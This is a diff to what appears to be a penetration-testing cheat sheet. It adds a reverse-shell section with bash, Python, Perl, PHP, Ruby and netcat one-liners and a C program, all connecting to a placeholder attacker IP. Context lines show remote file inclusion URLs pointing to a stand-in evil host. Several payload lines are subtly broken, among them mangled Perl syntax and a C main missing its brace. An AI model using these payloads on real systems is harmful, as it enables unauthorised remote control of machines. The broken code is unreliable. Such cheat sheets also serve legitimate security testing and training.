@@ -165,10 +165,71 @@ http://example.com/index.php?page=http://example.evil/shell.txt
 http://example.com/index.php?page=http://example.evil/shell.txt%00
 ```
 
+## Reverse Shell payload
+```bash
+#Bash
+bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
+/bin/bash -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
+/bin/sh -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
+
+#Python
+python -c 'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#Perl
+perl -e 'use
+Socket;$i="x.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
+{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh-i");};'
+
+#Perl Windows
+perl -MIO -e '$c=new IO :: Socket :: INET(PeerAddr,"x.x.x.x:4444");STDIN->fdopen($c,r);$ ~- >fdopen($c,w);system$_ while<>;'
+
+#PHP
+php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#Ruby
+ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+#Netcat
+nc -e /bin/sh x.x.x.x 4444
+nc -e cmd.exe x.x.x.x 4444
+/bin/sh | nc x.x.x.x 4444
+rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 4444 0/tmp/p
+```
+
+```c
+// gcc reverse.c -o reverse
+
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+int main (int argc, char ** argv)
+
+int scktd;
+struct sockaddr_in client;
+
+client.sin_family = AF_INET;
+client.sin_addr.s_addr = inet_addr("x.x.x.x"); // attacker IP
+client.sin_port = htons(4444); // attacker port
+
+scktd = socket(AF_INET,SOCK_STREAM,0);
+connect(scktd,(struct sockaddr *)&client,sizeof(client));
+
+dup2(scktd,0); // STDIN
+dup2(scktd,1); // STDOUT
+dup2(scktd,2); // STDERR
+
+execl("/bin/sh","sh","-i",NULL,NULL);
+
+return 0;
+```
+
+
 # Active Directory Pentesting
-
 ## Enumeration
-
 - To check local administrators in domain joined machine
 
 ```powershell
